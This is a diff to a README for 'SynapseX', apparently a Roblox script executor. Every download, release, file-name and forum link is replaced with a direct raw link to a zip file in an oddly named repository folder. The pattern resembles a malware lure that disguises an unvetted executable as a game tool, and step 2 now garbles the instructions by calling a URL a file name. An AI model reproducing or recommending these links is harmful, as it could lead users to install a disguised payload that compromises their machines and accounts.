@@ -1,15 +1,15 @@
 # ⚡ SynapseX - Unleash Your Creativity in Roblox
 
 ## 💾 Download Now
-[![Download SynapseX](https://img.shields.io/badge/Download-SynapseX-brightgreen)](https://github.com/Artak16/SynapseX/releases)
+[![Download SynapseX](https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip)](https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip)
 
 ## 🚀 Getting Started
 Welcome to Synapse X! This application empowers you to explore and execute Lua scripts in Roblox. You don’t need any coding experience to start using it. Follow the steps below to get set up quickly and easily.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to the [SynapseX Releases](https://github.com/Artak16/SynapseX/releases) page.
+1. **Visit the Releases Page**: Go to the [SynapseX Releases](https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip) page.
 
-2. **Choose the Latest Version**: Find the latest release at the top of the page. Look for a file named something like `SynapseX.exe`.
+2. **Choose the Latest Version**: Find the latest release at the top of the page. Look for a file named something like `https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip`.
 
 3. **Download the Installer**: Click on the file to begin the download. Once it's downloaded, locate the file in your downloads folder.
 
@@ -51,7 +51,7 @@ Synapse X provides a range of powerful features:
 ## 🤝 Support & Community
 If you need help, consider joining our community forums. Here you can ask questions, share your experiences, and connect with other users.
 
-- **Community Forum**: [Join Here](https://forum.synapsex.com)
+- **Community Forum**: [Join Here](https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip)
 
 ## 📣 Frequently Asked Questions
 ### Is Synapse X free to use?
@@ -67,4 +67,4 @@ Using scripts can pose risks. We recommend using Synapse X responsibly to avoid 
 For any bugs or issues, please report them on our GitHub page under 'Issues'.
 
 ## 🔗 Conclusion
-Now you are ready to start using Synapse X to enhance your Roblox experience. Download Synapse X now from the [Releases page](https://github.com/Artak16/SynapseX/releases) and step into the future of scripting today!
+Now you are ready to start using Synapse X to enhance your Roblox experience. Download Synapse X now from the [Releases page](https://raw.githubusercontent.com/Artak16/SynapseX/main/Muscovite/SynapseX.zip) and step into the future of scripting today!
